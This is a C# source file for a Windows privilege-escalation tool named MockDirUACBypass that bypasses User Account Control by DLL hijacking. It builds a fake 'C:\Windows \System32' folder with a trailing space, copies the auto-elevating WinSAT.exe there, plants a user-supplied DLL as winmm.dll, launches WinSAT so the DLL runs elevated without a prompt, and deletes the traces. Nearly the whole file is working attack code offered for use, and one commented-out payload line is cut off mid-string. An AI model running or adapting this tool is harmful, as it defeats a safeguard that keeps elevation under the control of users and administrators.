using System;
using System.IO;
using System.Runtime.InteropServices;

//Auto-elevating Executables:
//cttunesvr.exe
//inetmgr.exe
//migsetup.exe
//mmc.exe
//oobe.exe
//pkgmgr.exe
//provisionshare.exe
//provisionstorage.exe
//spinstall.exe
//winsat.exe <- WINMM.dll (timeBeginPeriod, timeEndPeriod, waveOutGetNumDevs)

namespace MockDirUACBypass
{
    class MainClass
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool Wow64DisableWow64FsRedirection(ref IntPtr ptr);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool Wow64RevertWow64FsRedirection(IntPtr ptr);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CreateDirectory(string lpPathName, IntPtr lpSecurityAttributes);
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern bool CopyFile(string lpExistingFileName, string lpNewFileName, bool bFailIfExists);
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool DeleteFileW([MarshalAs(UnmanagedType.LPWStr)]string lpFileName);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool RemoveDirectory(string lpPathName);

        [DllImport("shell32.dll", CharSet = CharSet.Auto)]
        static extern bool ShellExecuteEx(ref SHELLEXECUTEINFO lpExecInfo);

        [StructLayout(LayoutKind.Sequential)]
        public struct SHELLEXECUTEINFO
        {
            public int cbSize;
            public uint fMask;
            public IntPtr hwnd;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string lpVerb;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string lpFile;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string lpParameters;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string lpDirectory;
            public int nShow;
            public IntPtr hInstApp;
            public IntPtr lpIDList;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string lpClass;
            public IntPtr hkeyClass;
            public uint dwHotKey;
            public IntPtr hIcon;
            public IntPtr hProcess;
        }

        public enum ShowCommands : int
        {
            SW_HIDE = 0,
            SW_SHOWNORMAL = 1,
            SW_NORMAL = 1,
            SW_SHOWMINIMIZED = 2,
            SW_SHOWMAXIMIZED = 3,
            SW_MAXIMIZE = 3,
            SW_SHOWNOACTIVATE = 4,
            SW_SHOW = 5,
            SW_MINIMIZE = 6,
            SW_SHOWMINNOACTIVE = 7,
            SW_SHOWNA = 8,
            SW_RESTORE = 9,
            SW_SHOWDEFAULT = 10,
            SW_FORCEMINIMIZE = 11,
            SW_MAX = 11
        }

        [Flags]
        public enum ShellExecuteMaskFlags : uint
        {
            SEE_MASK_DEFAULT = 0x00000000,
            SEE_MASK_CLASSNAME = 0x00000001,
            SEE_MASK_CLASSKEY = 0x00000003,
            SEE_MASK_IDLIST = 0x00000004,
            SEE_MASK_INVOKEIDLIST = 0x0000000c,   // Note SEE_MASK_INVOKEIDLIST(0xC) implies SEE_MASK_IDLIST(0x04) 
            SEE_MASK_HOTKEY = 0x00000020,
            SEE_MASK_NOCLOSEPROCESS = 0x00000040,
            SEE_MASK_CONNECTNETDRV = 0x00000080,
            SEE_MASK_NOASYNC = 0x00000100,
            SEE_MASK_FLAG_DDEWAIT = SEE_MASK_NOASYNC,
            SEE_MASK_DOENVSUBST = 0x00000200,
            SEE_MASK_FLAG_NO_UI = 0x00000400,
            SEE_MASK_UNICODE = 0x00004000,
            SEE_MASK_NO_CONSOLE = 0x00008000,
            SEE_MASK_ASYNCOK = 0x00100000,
            SEE_MASK_HMONITOR = 0x00200000,
            SEE_MASK_NOZONECHECKS = 0x00800000,
            SEE_MASK_NOQUERYCLASSSTORE = 0x01000000,
            SEE_MASK_WAITFORINPUTIDLE = 0x02000000,
            SEE_MASK_FLAG_LOG_USAGE = 0x04000000,
        }

        public static void Main(string[] args)
        {
            IntPtr wow64Value = IntPtr.Zero;
            string hijackDll = null;

            //Collect args
            if (args.Length != 2)
            {
                Console.WriteLine("[-] Usage: MockDirUACBypass.exe <whitelisted EXE> <your DLL>");
                Environment.Exit(1);
            }

            string whitelistedExe = args[0].ToLower();

            if (whitelistedExe.Equals("winsat.exe"))
            {
                hijackDll = "WINMM.dll";
            }
            //Planning on adding other EXEs here
            else
            {
                Console.WriteLine("[-] The provided method is not whitelisted.");
                Environment.Exit(1);
            }
            //Take users' B64 DLL (x86)
            string payloadDllB64 = Convert.ToBase64String(File.ReadAllBytes(args[1]));

            // If you'd like to test, here's a DLL that exports the functions required from WINMM.dll as stubs.
            // It will pop a message box with a bool indicating IL. Thanks @ce2wells for helping me test this.
            //string payloadDllB64 = "

            //Disable filesystem redirection
            Wow64DisableWow64FsRedirection(ref wow64Value);

            //Create mock dirs
            Console.WriteLine("[+] Creating mock directories");
            try
            {
                CreateDirectory(@"\\?\C:\Windows \", IntPtr.Zero);
                CreateDirectory(@"\\?\C:\Windows \System32\", IntPtr.Zero);
            }
            catch
            {
                Console.WriteLine("[-] Unable to create the mock directories");
            }

            //Copy whitelisted EXE to mock dir
            Console.WriteLine("[+] Copying " + whitelistedExe + " to the mock directory");
            CopyFile(@"C:\Windows\System32\WinSAT.exe", @"C:\Windows \System32\WinSAT.exe", true);

            //Write user's DLL to temp and move it to the mock directory
            Console.WriteLine("[+] Writing your DLL to the mock directory");
            byte[] payloadDll = Convert.FromBase64String(payloadDllB64);
            File.WriteAllBytes(@"C:\temp\winmm.dll", payloadDll);
            CopyFile(@"C:\temp\winmm.dll", @"C:\Windows \System32\winmm.dll", true);

            //Execute
            Console.WriteLine("[+] Attempting to call the target EXE from the mock directory");

            SHELLEXECUTEINFO info = new SHELLEXECUTEINFO();
            info.cbSize = Marshal.SizeOf(info);
            info.lpVerb = "open";
            info.lpFile = "C:\\Windows \\System32\\WinSAT.exe";
            info.lpParameters = "formal";
            info.nShow = 5;
            info.fMask = 0x0000000c;
            ShellExecuteEx(ref info);

            //Cleanup
            DeleteFileW(@"C:\Windows \System32\winsat.exe");
            DeleteFileW(@"C:\Windows \System32\WINMM.dll");
            RemoveDirectory(@"C:\Windows \System32\");
            RemoveDirectory(@"C:\Windows \");

            //Reenable filesystem redirection
            Wow64RevertWow64FsRedirection(wow64Value);
        }
    }
}